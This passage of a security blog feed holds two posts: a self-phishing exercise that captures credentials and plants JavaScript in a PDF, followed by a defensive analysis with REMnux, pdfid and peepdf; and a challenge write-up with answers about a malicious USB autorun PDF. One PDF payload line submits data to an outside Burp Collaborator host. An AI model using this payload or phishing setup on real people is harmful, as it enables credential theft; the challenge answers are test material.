<p><img src="/assets/img/blog2-phish/42.png" alt=" template &gt;&lt;" /></p>

<p>Just look at the dashboard. We find:
How many times the link has been clicked
How many times data was submitted
How many times link the email has been opened</p>

<p><img src="/assets/img/blog2-phish/43.png" alt=" template &gt;&lt;" /></p>

<p>Click on the button i.e view results.</p>

<p><img src="/assets/img/blog2-phish/44.png" alt=" template &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/45.png" alt=" template &gt;&lt;" /></p>

<p>Yea, we successfully captured the username and password.</p>

<p>It’s time to open the pdf file which we downloaded earlier
.
It executes the js code which we inserted. See the pop created by the payload.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">alter alert</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/46.png" alt=" template &gt;&lt;" /></p>

<p>Of Course, you can do more than this. I recommend exploring more on this topic.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">submitForm</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>We have to click allow every time and this makes the process very tedious.</p>

<p>( Only for the above payload)</p>

<p><img src="/assets/img/blog2-phish/47.png" alt=" security-warning &gt;&lt;" /></p>

<p>I got the DNS and HTTP requests in my burp collab server.</p>

<p><img src="/assets/img/blog2-phish/48.png" alt=" burp-server &gt;&lt;" /></p>

<p>This was all about how to launch a phishing campaign.</p>

<h3 id="analyzing">Analyzing</h3>

<p>From this point, we are going to analyze all these activities.</p>

<p>The analysis part should always be done in a sandbox environment. Going out of the sandbox environment is prone to death. XD</p>

<p>The first step of yours always should be searching for anything weird in email.</p>

<p> </p>

<p><strong>1.Analyze source</strong></p>

<p> </p>

<p><strong>2.Try to find the origin of email such as sender IP</strong></p>

<p>Sites to look for analyzing email header</p>

<p>Link: <a href="https://toolbox.googleapps.com/apps/messageheader/analyzeheader">Toolbox</a></p>

<p>Link: <a href="https://mha.azurewebsites.net/">mha</a></p>

<p> </p>

<p><strong>3.Extracting Urls and Defanging Urls</strong></p>

<p>Link: <a href="https://gchq.github.io/CyberChef/#recipe=Extract_URLs%28false%29Defang_URL%28true,true,true,%27Valid%20domains%20and%20full%20URLs%27%29&amp;input=aHR0cDovL2dvb2dsZS5jb20">CyberChef</a></p>

<p> </p>

<p><strong>4.Checking DNS records of suspicious URLs or IP addresses</strong></p>

<p> </p>

<p><strong>5.Take a Screenshot of suspicious URLs or IP addresses</strong></p>

<p>Link: <a href="https://www.url2png.com/">URL2PNG</a></p>

<p> </p>

<p><strong>6.Checking if the URLs or IPs are blacklisted or not</strong></p>

<p>Link: <a href="https://www.ipvoid.com/ip-blacklist-check/">IPVOID</a></p>

<p> </p>

<p><strong>7.Checking if the URLs or Ip addresses are malicious or not</strong></p>

<p>Link: <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a></p>

<p> </p>

<p><strong>8.Downloading the attachments, get the hash of it then analyze if they are malicious or not</strong></p>

<p>Link: <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a></p>

<p>Link: <a href="https://talosintelligence.com/talos_file_reputation">talosintelligence</a></p>

<p> </p>

<p><strong>9.Finally we go deeper, we use different malware analysis tools. Both automatic and manual approaches should be followed.</strong></p>

<p> </p>

<p>Of course, there are more than this, but according to our context for this blog, we are going to analyze the attached pdf.</p>

<p>I am going to use remnux distro to analyze the pdf file.</p>

<blockquote>
  <p>” <strong>REMnux®</strong> is a Linux toolkit for reverse-engineering and analyzing malicious software. REMnux provides a curated collection of free tools created by the community. Analysts can use it to investigate malware without having to find, install, and configure the tools.</p>
</blockquote>

<p>I have already pulled the image.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull remnux/remnux-distro
docker run <span class="nt">--rm</span> <span class="nt">-itd</span> remnux/remnux-distro /bin/bash
docker <span class="nb">cp </span>downloadme.pdf <span class="s1">'&lt;contid&gt;:/tmp'</span>
docker <span class="nb">exec</span> <span class="nt">-it</span> d3511ccab833 /bin/bash
</code></pre></div></div>

<p>We are now into the container.</p>

<p><img src="/assets/img/blog2-phish/49.png" alt=" burp-server &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/50.png" alt=" burp-server &gt;&lt;" /></p>

<p>First, check if the pdf has the correct magic number or not.</p>

<p><img src="/assets/img/blog2-phish/51.png" alt=" pdf-magic-num &gt;&lt;" /></p>

<p>To check it, visit here: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Signatures</a></p>

<p>It seems correct.</p>

<p>Let’s analyze the pdf file with a tool called <strong>pdfid</strong>.</p>

<p><img src="/assets/img/blog2-phish/52.png" alt=" pdfid &gt;&lt;" /></p>

<p>It contains some javascript. It is better for us not to open the pdf file as /OpenAction is also 1 which means the js will take some actions on opening the pdf file.</p>

<p>What other headers can you find below?</p>

<p>The first 7 words or less to it , you can find them in almost every pdf.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Page - the number of pages in pdf

/Encrypt - stipulates a password need to be read

/ObjStm - object streams

/Js - pdf file may contains js code which could be malicious to open

/AA  and /OpenAction - action that will carried out automatically when we open a pdf file. Could automatically launch malicious js commands

/AcroForm - pdf form authored with Adobe Acrobat Pro/Standard

/JBIG2Decode - indicates pdf uses JBIG2Decode compression

/RichMedia - use to embed files,videos etc on pdf

/Launch - to lauch some actions

/EmbeddedFile -   contains some external files

/XFA - XML Forms Architecture

/URI -  Url to access

</code></pre></div></div>

<p>I find <strong>peedpdf</strong> more cooler than <strong>pdfid</strong> as <strong>peepdf</strong> can provide the same information. It has been found that the pdf contains some suspicious elements i.e JS</p>

<p><img src="/assets/img/blog2-phish/53.png" alt=" peepdf &gt;&lt;" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdfid lastone.pdf
peepdf lastone.pdf
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/54.png" alt=" peepdf &gt;&lt;" /></p>

<p>We can extract the js contents using these tools. For this, we have to write a simple script. i.e extract js &gt; aything.txt
save it in a file.</p>

<p>echo ‘extract js &gt; extracted.txt’ &gt; anything.txt</p>

<p>now extracting the js content.</p>

<p>peepdf -s extract.txt malicouspdf.pdf</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'extract js &gt; extracted.txt'</span> <span class="o">&gt;</span> anything.txt
peepdf <span class="nt">-s</span> extract.txt malicouspdf.pdf

</code></pre></div></div>
<p><img src="/assets/img/blog2-phish/55.png" alt=" peepdf-extract &gt;&lt;" /></p>

<p>The js content is successfully extracted.</p>

<p>Thank you for reading. :)</p>

<p>Have a good day/night.</p>]]></content><author><name></name></author><category term="phishing" /><summary type="html"><![CDATA[Phish.. Phish.. Phish.. In this blog, I am going to phish myself. Jumping directly into a conclusion does not make sense so I will be explaining from “how-to-create” to “how-to-do”.]]></summary></entry><entry><title type="html">Suspicious USB Stick</title><link href="http://localhost:4000/blog/usb-btlo" rel="alternate" type="text/html" title="Suspicious USB Stick" /><published>2021-04-07T00:00:00+05:45</published><updated>2021-04-07T00:00:00+05:45</updated><id>http://localhost:4000/blog/usb-btlo</id><content type="html" xml:base="http://localhost:4000/blog/usb-btlo"><![CDATA[<p> </p>

<h3 id="challenge-description">Challenge Description</h3>

<!-- excerpt-start -->
<p><span style="font-size:30px;">O</span>ne of our clients informed us they recently suffered an employee data breach. As a startup company, they had a constrained budget allocated for security and employee  <!-- excerpt-end --> training. I visited them and spoke with the relevant stakeholders. I also collected some suspicious emails and a USB drive an employee found on their premises. While I am analyzing the suspicious emails, can you check the contents on the USB drive?</p>

<p> 
 
 </p>

<p><strong>1. What file is the autorun.inf running?</strong></p>

<p>→ README.pdf</p>

<p><img src="/assets/img/blog1/1.png" alt="autorun &gt;&lt;" class="center" /></p>

<p>autorun.inf - It’s a text file that can be used to automatically run some applications or load when some media like usb,cd/dvd is inserted.</p>

<p><img src="/assets/img/blog1/1p2.png" alt="autorun &gt;&lt;" class="left" /></p>

<p>For more info you can visit this link. <a href="https://www.samlogic.net/articles/autorun-commands.htm">Click Here </a></p>

<p> 
 </p>

<p><strong>2. Does the pdf file pass virustotal scan? (No malicious results returned)</strong></p>

<p>→ False</p>

<p>As it also scans pdfs which is obvious.</p>

<p><img src="/assets/img/blog1/2.png" alt="scan &gt;&lt;" class="left" /></p>

<p>The pdf is utterly suspected as malicious.</p>

<p><img src="/assets/img/blog1/3.png" alt="virtustotalscan &gt;&lt;" class="left" /></p>

<p> 
 </p>

<p><strong>3. Does the file have the correct magic number?</strong></p>

<p>→ True</p>

<p>To check the signature , visit here: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Click Here</a>
<img src="/assets/img/blog1/4.png" alt=" signature &gt;&lt;" class="left" />
The magic bytes matches with pdf magic bytes so the file has correct magic number.</p>

<p>Let’s first analyze the pdf file with a tool pdfid.
https://blog.didierstevens.com/programs/pdf-tools</p>

<p> </p>

<!-- <pre>
<b style="color:black;" > -->
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Page - the number of pages in pdf

/Encrypt - stipulates a password need to be read

/ObjStm - object streams

/Js - pdf file may contains js code which could be malicious to open

/AA and /OpenAction - action that will carried out automatically when we open a pdf file. Could automatically launch malicious js commands

/AcroForm - pdf form authored with Adobe Acrobat Pro/Standard

/JBIG2Decode - indicates pdf uses JBIG2Decode compression

/RichMedia - use to embed files,videos etc on pdf

/Launch - to lauch some actions

/EmbeddedFile - contains some external files

/XFA - XML Forms Architecture

/URI - Url to access
</code></pre></div></div>
<!-- </b> 
</pre> -->

<p><img src="/assets/img/blog1/5.png" alt=" pdfidresult &gt;&lt;" class="left" /></p>

<p>As we see it has some js contents which will automatically open on opening the pdf file and that seems particularly malicious.
The same type of result can be obtained via peepdf tool.
Here is the link: <a href="https://eternal-todo.com/tools/peepdf-pdf-analysis-tool">Click Here</a> tut for this tool. You can also download the tool if you want. :) Btw it only runs in python2.
<img src="/assets/img/blog1/6.png" alt=" peepdf &gt;&lt;" class="left" /></p>

<p>“pdf-parser - This tool will parse a PDF document to identify the fundamental elements used in the analyzed file. It will not render a PDF document.”
On checking each objects , the object 28 seems rather interesting than other.
This is just my guess could be wrong.</p>

<p>/F - indicates file</p>

<p>/D - indicates directory</p>

<p>/P - indicates path</p>

<p><img src="/assets/img/blog1/7.png" alt=" peepdf &gt;&lt;" class="left" /></p>

<p> 
 </p>

<p><strong>4. What OS type can the file exploit? (Linux, MacOS, Windows, etc)</strong></p>

<p>→ Windows</p>

<p> 
 </p>

<p><strong>5. A Windows executable is mentioned in the pdf file, what is it?</strong></p>

<p>→ cmd.exe</p>

<p> 
 </p>

<p><strong>6. How many suspicious /OpenAction elements does the file have?</strong></p>

<p>→ 1</p>

<p> 
 </p>

<p>Thank You :)</p>]]></content><author><name></name></author><category term="malware" /><category term="something" /><summary type="html"><![CDATA[  Challenge Description One of our clients informed us they recently suffered an employee data breach. As a startup company, they had a constrained budget allocated for security and employee]]></summary></entry></feed>